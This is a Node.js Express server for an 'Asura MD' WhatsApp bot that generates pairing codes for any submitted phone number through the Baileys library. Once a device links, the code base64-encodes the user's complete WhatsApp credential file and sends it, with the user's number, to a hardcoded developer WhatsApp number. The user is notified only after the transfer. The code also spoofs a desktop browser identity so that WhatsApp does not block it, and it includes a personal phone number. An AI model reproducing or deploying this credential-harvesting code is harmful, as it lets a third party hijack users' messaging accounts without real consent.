import express from 'express';
import { 
    makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    Browsers, 
    makeCacheableSignalKeyStore, 
    DisconnectReason 
} from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pair', async (req, res) => {
    let phone = req.query.number; 
    if (!phone) return res.send({ error: "Phone number is required" });

    // ഓരോ യൂസർക്കും തനതായ ഐഡി നൽകുന്നു
    const id = Math.random().toString(36).substring(2, 10);
    const { state, saveCreds } = await useMultiFileAuthState(`./temp_${id}`);

    try {
        const sock = makeWASocket({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
            },
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            // വാട്സാപ്പ് ബ്ലോക്ക് ചെയ്യാത്ത ഏറ്റവും പുതിയ ഡെസ്ക്ടോപ്പ് ഐഡന്റിറ്റി 👇
            browser: ["Chrome (Linux)", "120.0.0.0", ""] 
        });

        // പെയറിംഗ് കോഡ് ഉടൻ നൽകാൻ സഹായിക്കുന്നു
        if (!sock.authState.creds.registered) {
            await delay(2000); 
            phone = phone.replace(/[^0-9]/g, '');
            
            const code = await sock.requestPairingCode(phone);
            
            if (!res.headersSent) {
                res.send({ code: code });
            }
        }

        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'open') {
                // കണക്ഷൻ ഓപ്പൺ ആയാൽ ഉടൻ അയക്കാതെ ഫയലുകൾ പൂർണ്ണമാകാൻ 10 സെക്കൻഡ് നൽകുന്നു
                await delay(10000); 
                
                const credsPath = `./temp_${id}/creds.json`;
                if (fs.existsSync(credsPath)) {
                    const authFile = JSON.parse(fs.readFileSync(credsPath));
                    const sessionId = Buffer.from(JSON.stringify(authFile)).toString('base64');

                    const myNumber = "917736811908@s.whatsapp.net";
                    const sessionID = `Asura_MD_${sessionId}`;
                    
                    // നിങ്ങളുടെ നമ്പറിലേക്ക് അയക്കുന്നു
                    await sock.sendMessage(myNumber, { text: sessionID });
                    await sock.sendMessage(myNumber, { 
                        text: `*👺 ASURA MD SESSION CONNECTED*\n\n✅ *User Number:* ${phone}\n\n> Don't share this ID!` 
                    });

                    // യൂസറുടെ നമ്പറിലേക്കും അയച്ചു കൊടുക്കാം
                    await sock.sendMessage(sock.user.id, { text: `*Connected Successfully!* 👺\n\nYour session ID has been sent to the developer.` });

                    await delay(5000);
                    // സെഷൻ എടുത്തു കഴിഞ്ഞാൽ ക്ലീൻ അപ്പ്
                    try {
                        sock.logout();
                        fs.rmSync(`./temp_${id}`, { recursive: true, force: true });
                    } catch (e) {}
                }
            }

            if (connection === 'close') {
                const reason = lastDisconnect?.error?.output?.statusCode;
                if (reason !== DisconnectReason.loggedOut) {
                    // അപ്രതീക്ഷിതമായി ക്ലോസ് ആയാൽ താൽക്കാലിക ഫയലുകൾ നീക്കം ചെയ്യുന്നു
                    try { fs.rmSync(`./temp_${id}`, { recursive: true, force: true }); } catch (e) {}
                }
            }
        });

    } catch (err) {
        console.log("Multi-User Error:", err);
        if (!res.headersSent) {
            res.status(500).send({ error: "Server busy. Try again after 1 minute." });
        }
    }
});

app.listen(port, () => console.log(`Asura MD Multi-User Server on port ${port}`));
